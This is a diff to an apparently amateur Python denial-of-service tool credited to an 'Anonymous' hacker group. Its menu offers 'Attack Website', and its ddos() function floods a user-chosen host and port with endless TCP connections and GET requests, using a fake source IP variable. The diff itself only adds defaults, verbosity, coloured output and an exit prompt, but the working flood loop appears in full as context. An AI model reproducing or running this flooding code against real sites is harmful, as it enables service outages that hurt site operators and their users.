@@ -14,7 +14,7 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-print(f"""{bcolors.HEADER}
+print(f"""{bcolors.FAIL}
 
  ______  __    __  ______  __  __  ______  ______  ______  __  __  ______  
 /\  ___\/\ "-./  \/\  __ \/\ \/ / /\  ___\/\  ___\/\  __ \/\ \/\ \/\__  _\ 
@@ -28,7 +28,7 @@ print("""   Developed by bloos3rpent of Anonymous Caloocan Ground and Cyber Unit
 
 already_connected = 0
 def main():
-    print(f"""{bcolors.OKGREEN}
+    print(f"""{bcolors.OKBLUE}
     [1] Attack Website
     [2] Check Website Status
     [3] Exit
@@ -36,7 +36,8 @@ def main():
 
     def ddos():
         target = input('target: ')
-        port = int(input('port: '))
+        port = int(input('port [80 by default]: ') or 80)
+        verbose = int(input("Verbose (Does not affect the attack)[200 by default]: ") or 200)
         print("Attacking " + target + " in port " "%s" % (port))
         fake_ip = '182.21.20.32'
 
@@ -48,6 +49,7 @@ def main():
         def attack():
             while 1 > 0:
                 try:
+
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.connect((target, port))
                     s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target, port))
@@ -57,7 +59,7 @@ def main():
                     already_connected += 1
                     packetssent = str(already_connected)
 
-                    if already_connected % 200 == 0:
+                    if already_connected % verbose == 0:
                         print(f"{bcolors.OKGREEN}packets sent: {bcolors.ENDC}" + packetssent)
                 except:
                     print(f"{bcolors.FAIL}Connection Timeout server might be already down or check your internet connection{bcolors.ENDC}")
@@ -72,9 +74,10 @@ def main():
         time.sleep(1)
 
         try:
-            print(urllib.request.urlopen("http://" + site).getcode())
+            status = urllib.request.urlopen("http://" + site).getcode()
+            print(f"{bcolors.OKGREEN}Status: %s {bcolors.ENDC}" % (status))
         except urllib.error.HTTPError as err:
-            print(err.code)
+            print(f"{bcolors.FAIL} Status: %s {bcolors.ENDC}" % (err.code))
         except:
             print("error")
 
@@ -86,10 +89,13 @@ def main():
     elif action == "2":
         ping()
     elif action == "3":
-        exit()
+        confirm = input("Do you want to exit? y/n: ")
+        if confirm.lower() == "y":
+            exit()
+        else:
+            main()
     else:
-        print("Invalid")
+        print(f"{bcolors.WARNING}Invalid{bcolors.ENDC}")
         time.sleep(1)
         main()
-
 main()
